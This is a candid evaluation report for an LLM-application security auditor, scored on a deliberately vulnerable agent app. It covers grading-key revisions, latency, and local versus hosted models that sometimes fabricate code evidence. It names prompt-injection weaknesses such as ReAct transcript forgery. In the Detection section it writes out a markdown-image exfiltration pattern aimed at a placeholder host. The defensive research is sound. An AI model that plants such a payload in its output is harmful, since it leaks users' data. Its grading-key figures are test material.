# Results

Measured on `damn-vulnerable-llm-agent`, upstream commit `c0cf9a14`. Earlier
long-form discussion is in git before commit `c10daa0`.

## Detection

Scored against `grading_keys/damn-vulnerable-llm-agent.ground_truth.json`, eight
entries.

| System | Matched | Missed |
|---|---|---|
| This auditor | **3 of 8** | DVLA-01, 02, 05, 08, 09 |
| Baseline A, grep/AST rules | **4 of 8** | DVLA-05, 07, 08, 09 |
| Baseline B, SBOM-only | **0 of 8** | all |

```
auditor only   DVLA-07
baseline only  DVLA-01, DVLA-02
both           DVLA-03, DVLA-06
neither        DVLA-05, DVLA-08, DVLA-09
```

**The auditor reaches DVLA-07 alone** — the supply-chain entry — because that
means joining an LLM surface to a component in a bill of materials, which no
grep rule has. **Baseline A reaches DVLA-01 and DVLA-02 alone**: a system prompt
that is the sole access control, and a tool taking a bare identifier. Both are
absences — a missing check rather than a present capability — and a regex over
tool definitions catches them where this auditor's dataflow does not.

### This key was revised downward, twice, on review

The figures above are lower than earlier drafts of this report, and both
revisions removed something that flattered the tool.

**First**, the semantic probe's only contributing finding was withdrawn: it had
flagged a wholly static template by describing what the application does rather
than what the template says. See Objective 5.

**Second**, an independent review found two entries grading the detector's own
coordinates rather than the defect. DVLA-05 anchored at `main.py:71`, character
for character the finding `auditability.py` emits, so it could not falsify the
check that produced it; it now anchors at `main.py:84`, where the trace is
actually discarded, and the check no longer reaches it. DVLA-06 described
untrusted input reaching a model, which is true of every chat application ever
built; it now names the ReAct transcript-forgery mechanism that makes it a
defect here.

Three entries were added that sit at **no extracted surface at all** — the raw
database exception returned to the agent, stored rows re-entering as
observations, and the discarded trace. That matters structurally: every entry in
the first draft landed exactly on a surface the extractor emits, so recall was
measured over a denominator drawn from the tool's own inventory. **Three of
eight now sit off it**, which is a ratio rather than a cure — the other five
still constrain the join with a `surface_name` that is a literal row in
`detector_names.py`. The score fell from 4 of 6 to 3 of 8 as a result.

**A defect the reviewer proposed and I did not add**: model output reaching an
HTML renderer. `unsafe_allow_html=True` appears four times — `main.py:36`,
`utils.py:19`, `:41`, `:71` — and none carries model output, so the HTML sink is
not there and `st.write(response["output"])` escapes HTML.

That is not the whole sink, and saying so is the point of recording the
refusal. `st.write` renders **markdown**, so an attacker-steered response
containing `![](https://host/?d=…)` exfiltrates on render, at `main.py:83` and
again at `:56-57` where the raw agent trace is written. A future entry belongs
there; it is absent because nobody has verified it, not because it was ruled
out.

### A measurement that had to be redone

The figures above were first taken against a tree that was **not** at
`c0cf9a14`: a `PyYAML==5.3.1` line had been appended to the audited app's
`requirements.txt` by hand and not reverted. That single line turned an
undeclared dependency into a declared, exactly-pinned one, which changed which
check reported DVLA-07 — an advisory lookup on the injected pin rather than the
surface-to-component join the set-difference argument credits — and caused the
emitted OpenVEX document to assert CVE-2020-14343 against a third party's named
commit that is not true of it.

`tests/test_no_mutation.py` could not catch this. It proves the *tool* writes
nothing to an audited tree, and a person had done the editing.

Re-measured on a restored tree: **the totals are unchanged** (4 / 5 / 0 of 6),
DVLA-07 now matches via `undeclared_dependency` with `mapping_reason:
used_but_undeclared` and no purl, and no OpenVEX document is written because
there are no advisory findings. One published figure did move —
`with_vex_evidence` was **1 and is 0**; that evidence was entirely the injected
pin.

`src/fetch_repo.check_tree_matches_pin` now refuses to audit a tree that does
not match the commit its manifest or grading key pins, or that is modified
against it. Verified: it rejects exactly the run that produced the contaminated
figures.

## Latency

Three runs each, one machine, `qwen2.5-coder:7b-instruct` on local Ollama.

| Configuration | Typical | Findings |
|---|---|---|
| Static only, model unreachable | **0.94 s** | 6 |
| Default, model writes advice | **12.4 s** | 6 |
| `--semantic-probe` | **15.1 s** | 7 |

**Latency is local inference in every configuration.** The first row is a
complete audit — extraction, Syft, Trivy, all six static checks — with only the
model made unreachable. Static analysis and both scanners are ~6% of a default
run. The default is not model-free: it calls the model once per finding for
advice. The probe adds 2.7 s, scaling with prompt-template count, not repo size.

Supports statements about *where the time goes*, not absolute throughput. No
cloud configuration was measured.

## Objective 5 — local versus hosted model

Reinstated 2026-09-05 when API access was supplied. The original refusal, and
why it stood, is in the deviations section below; what changed is access, not
the reasoning.

**Design.** The static checks use no model, so the only model-dependent
detection is the semantic probe. The comparison is therefore *per prompt
template*: which templates each model calls injectable, and on what grounds.
`experiments/` drives the auditor through the `model_ask_fn` seam, so no module
under `src/` changes and the audit path stays offline.

Local: `qwen2.5-coder:7b-instruct`, Ollama, `temperature 0, seed 0`.
Hosted: `z-ai/glm-5.2` via OpenRouter, `temperature 0` — **no seed equivalent**,
so the hosted arm was sampled three times to check stability.

### Result

| | Verdict on `main.py:21` | Latency | Stable over 3 runs |
|---|---|---|---|
| `qwen2.5-coder:7b-instruct` | VULNERABLE | 0.6–0.9 s | yes |
| `z-ai/glm-5.2` | SAFE | 1.8–2.2 s | yes |

Both are reproducible and they disagree. The template:

```python
system_msg = """Assistant helps the current user retrieve the list of their
recent bank transactions ... Assistant will ONLY operate on the userId returned
by the GetCurrentUser() tool, and REFUSE to operate on any other userId..."""
```

**The hosted model is correct.** It answered: *"The template contains no
variables or placeholders injecting user-controlled data into the instruction
text."* That is literally true — the string is static, with no interpolation.
The local model answered that the template *"directly includes the `userId`
returned by the `GetCurrentUser()` tool into the instruction text"*, which is
false; it described what the application does, which the template narrates in
prose, rather than what the template is.

**What this cost the headline, and what was done about it.** The probe's single
contribution to detection — DVLA-01, the entry that took the auditor from 4 of 6
to 5 of 6 — was a true positive resting on a false rationale. The grading key
anchors DVLA-01 at that line because the system prompt is the only control on
which user's data is read; the probe flagged the same line for a reason that
does not hold. Two different claims sharing a line number.

`semantic_probe` was then changed: a template whose text contains no
interpolation point is refuted **statically, without a model call**, because
this check's claim is that a runtime value sits undelimited in instruction text
and such a template has no runtime value in it. The false positive is now
unreachable rather than unlikely. The auditor's published score fell from 5 of 6
to 4 of 6 as a result, and to 3 of 8 once the key was widened (see Detection) —
**the study's main effect was to lower this project's own headline**, which is
the outcome a comparison is for.

**Answering the objective, on this evidence.** One application, one template,
one hosted model. On the single case where the two could be compared, the
open-weight model was **less** accurate, and its error was the kind that inflates
a security tool's apparent recall — a false rationale landing on a true finding.
That is one data point and is stated as one: it does not establish that hosted
models are generally better at this task, and the sample cannot support a rate.

### Widened: four models, two applications

The single-template result above is a data point. Repeating it:

**On templates that genuinely interpolate** — `rag-tutorial-v2`, five prompt
templates, two of which contain a runtime value — `qwen2.5-coder:7b-instruct`
(local), `qwen/qwen-2.5-coder-32b-instruct` and `z-ai/glm-5.2` **agree on both
templates a model was asked about**, and on each they name a real
interpolation point (`{question}`; `{expected_response}` or
`{actual_response}` on the second). The local model is not
worse here.

That is 2 of 5, not 5 of 5. The other three were settled before any model saw
them — their text is not written literally at that line — and the run
originally published them as agreement, which is the defect
`experiments/agreement.py` now prevents. Three models concurring about a
template none of them read is not a result.

**On the static template that produced the false positive**, asked directly of
four models:

| Model | Verdict | |
|---|---|---|
| `qwen2.5-coder:7b-instruct` (local) | VULNERABLE | wrong — invented `{name}` |
| `qwen/qwen-2.5-coder-32b-instruct` | SAFE | right |
| `z-ai/glm-5.2` | SAFE | right |
| `openai/gpt-4o-mini` | VULNERABLE | wrong — invented `userId` |

**This is not a local-versus-hosted result, and reporting it as one would be
wrong.** A hosted model from a major vendor makes the same error as the local
one, while the *same family* at 4.5× the size does not. Both failures are the
same shape: the model **named an interpolation point that is not in the text**.
Two of four models hallucinated evidence for a security finding.

**What that means for the objective.** The proposal asks whether open-weight
models can compete with frontier offerings. On this task the axis that predicted
correctness was not open-versus-hosted — `qwen-32B` is open-weight and was
right, `gpt-4o-mini` is hosted and was wrong. The useful conclusion is narrower
and more actionable: **a model's claim about code must be checked against the
code**, because the failure was not a judgement call but a fabricated citation.
That is why the fix went into `semantic_probe.py` as a static refutation rather
than into the prompt — it holds whichever model is configured.

### Data exposure, measured and unmeasurable

**Measured, and the figure below is withdrawn.** It was published as "2671
bytes per arm, one request per prompt template. Transmitted: the prompt
template's source text, surface file paths and line numbers, surface kinds and
names." Both halves were wrong, and the study's own saved output shows it: the
three-arm run recorded **3 requests for 5 templates**, because the planner is
driven through the same seam as the probe and a template settled on its own text
generates no request at all. So one of those requests carried no template text,
and three of the templates were never transmitted.

The ledger now classifies each prompt and derives the field list from what was
actually sent, so a run that transmitted only the planner's prompt says so. The
byte figure cannot be restated here: it needs a re-measure over an app with
prompt templates, which `docs/TODO.md` carries.

**Observed, not merely predicted:** `glm-5.2` returned different verdicts for
the same template on `test_rag.py:4` across runs — flagging it once and refuting
it once, with identical input. The hosted arm has no `seed`, so a single run is
a single sample, and any figure taken from one is quoted as such.

**Not measurable from here**, and stated rather than dressed up: provider
retention, whether the data trains a model, sub-processors and jurisdiction, and
— specific to OpenRouter — **which upstream provider actually served the
request**, unless routing is pinned. The observed run was served by Baidu. That
last point is worth more than the byte count: the operator chose "GLM-5.2", not
a company.

**Operationally**, this is why the tool is not built this way. The study sent
one public, deliberately vulnerable file. An audit of a private repository would
send its prompts, paths and component inventory, and the four unmeasurable items
would apply to all of it.

## Why this tool rather than a scanner

On `security-agent-testbed`, Trivy finds 311 vulnerabilities; this auditor
reports 0 findings and 79 advisory-carrying components reached by no LLM
surface. Both correct. The pair is the point: this answers "does the LLM reach
it?", not "is it vulnerable?".

## Methodology deviations from the proposal

**Objective 5 — local vs cloud-hosted frontier comparison — was not run.** No
funded API access, and running it means transmitting the audited app's source,
prompts and vulnerability evidence to an external provider: the exposure this
project exists to avoid.

What is established: the tool completes an end-to-end audit with a local model
and no external network at any point, enforced by `test_offline.py`, which
counts socket *attempts* rather than successes. What is **not**: Objective 5
asked a comparative question, and a comparison with one arm is not a comparison.
Nothing here shows an open-weight model matches or falls short of a frontier
one.

**RAG/data-layer retrieval risk was substituted with AUDITABILITY.** Retrieval
points are extracted as `DATA_SOURCE` surfaces and taint treats them as
untrusted, so indirect injection is partly covered under LLM01. But no check
reports a retrieval-layer risk as its own class, and retrieval poisoning has no
detector.

**`probe_injection` is a static analyser, not a sandbox.** The proposal
specified "in a sandboxed environment". Three reasons, two about coherence
rather than cost:

1. The app reaches `gpt-4-1106-preview` through LiteLLM, so executing it either
   transmits its prompts to an external provider — the exposure this project
   argues against — or, pointed at Ollama, measures `qwen2.5-coder` instead of
   the app. **This is not contradicted by the Objective 5 study below.** That
   objection is about the *audit path*, on an arbitrary URL, on every run. The
   study is a one-off measurement on a named public app, with every byte
   transmitted enumerated. A tool that phones home by default and a study that
   does so once, deliberately, on published code are different things.
2. It would trade away the never-executes guarantee that makes auditing an
   unknown URL safe, on every audit.
3. A general sandbox must synthesise a container for an app it has never seen,
   infer its entry point, wait on a server that may never bind, and drive a
   headless browser.

What the static approach shows: structural weakness in a prompt template is
detectable without execution, and cheaply. What it does not: that static matches
dynamic in recall, which would need the comparison this study did not run.

## Local versus hosted, over a whole audit

`--compare-models` audits the tree twice. Run against `damn-vulnerable-llm-agent`
at `c0cf9a14`, `qwen2.5-coder:7b-instruct` against `z-ai/glm-5.2`:

| | local | hosted |
|---|---|---|
| Findings | 6 | 6 |
| `findings.json` difference | — | **`model_run` only** |
| Advice written | 2 of 6 | 4 of 6 |
| Advice rejected | 4 | 1 |
| Advice unavailable | 0 | 1 |
| Wall clock | 14.9s | 122.3s |

**Detection was identical.** The two `findings.json` files differ in exactly one
field, `model_run`, and the six findings match line for line. That is not a
surprise once the pieces are named: the planner may reorder checks but never
subtract one, and this app's single prompt template interpolates nothing, so the
semantic probe refutes it from the text and neither model is ever asked. On this
app the model cannot change what is found, which makes it a poor choice of
comparison subject and a good demonstration of why the static checks carry the
result.

**The difference is in the advice**, the one stage where a better model showed
plainly: 4 of 6 findings got usable guidance from the hosted model against 2 of
6 from the local one, at eight times the wall clock and with the audited app's
source leaving the machine. One hosted entry came back `unavailable`.

One run, no seed on the hosted side. Quote it as a sample.

## The auto-drafted grading key, measured

`--compare-models` drafts a key with the local model when none exists. Run once
against `damn-vulnerable-llm-agent` at `c0cf9a14` -- a run the tool now refuses,
because that app has a shipped key -- here is what it produced:

| | |
|---|---|
| Entries drafted | 12 |
| OWASP classes used | `LLM06` for all 12 |
| Files named | `transaction_db.py` (8), `utils.py` (4) |
| Matched by the local arm | 0 of 12 |
| Matched by the hosted arm | 0 of 12 |

All twelve entries name surfaces the extractor really found, so the grounding
filter added afterwards keeps all twelve: the key is wrong in its judgements,
not in its coordinates, and no filter over coordinates can catch that.

**The key is not merely circular. It is noise.** It stamped one risk class on
every entry, never opened `main.py` -- where the prompt injection and the
discarded agent trace actually are -- and agreed with nothing, including the
audit run by the same model that wrote it. The shipped key -- itself
`ai_drafted` and `verified: false`, but written against the app's source and
revised under review -- finds 3 of 8 on the same tree.

The failure is worth naming precisely, because it is not the one predicted. The
risk anticipated was a *flattering* key: a model marking its own homework and
scoring well. What happened instead is that the drafting task and the auditing
task are different enough that the same model fails them differently, so the
score collapses to zero rather than inflating. Either way the number measures
nothing about the tool, which is what `key_drafted_by_scored_system` exists to
say on every figure such a key produces.

**It stays in the tool because it was asked for**, it is behind a flag, and its
output is self-describing. It is not a substitute for the shipped key, nothing
in this report is scored against it, and drafting is now refused outright for
any app that already has one -- the first run of this feature overwrote
`artifacts/agentic_auditor/evaluation.json`, replacing the 3-of-8 figure with a
0-of-12 measured against the drafted key.

## Threats to validity

- One application, eight entries, an unverified key drafted by the same system
  that built the tool.
- Both compared systems were authored with the app visible.
- The probe's verdict is model-dependent; another Ollama build may not reproduce
  it. `model_run` records the digest for that reason.
- `scorer.py` does not read `checks_narrowed`, so a narrowed run scores as a
  full one.

## Appendix — the pin

| App | Upstream | Commit |
|---|---|---|
| `damn-vulnerable-llm-agent` | https://github.com/ReversecLabs/damn-vulnerable-llm-agent | `c0cf9a14adad76e9d6a53c41741f625334bd9971` |

The earlier corpus (`vuln-app-1-support-agent`, `oss-app-langgraphjs-starter`,
`oss-app-react-agent`) was removed 2026-09-04. Its published figures — grep
baseline 5 of 6 against the auditor's 2 of 6 — were measured against a tool that
had no LLM02, AUDITABILITY or probe check, and are not comparable with the
table above.
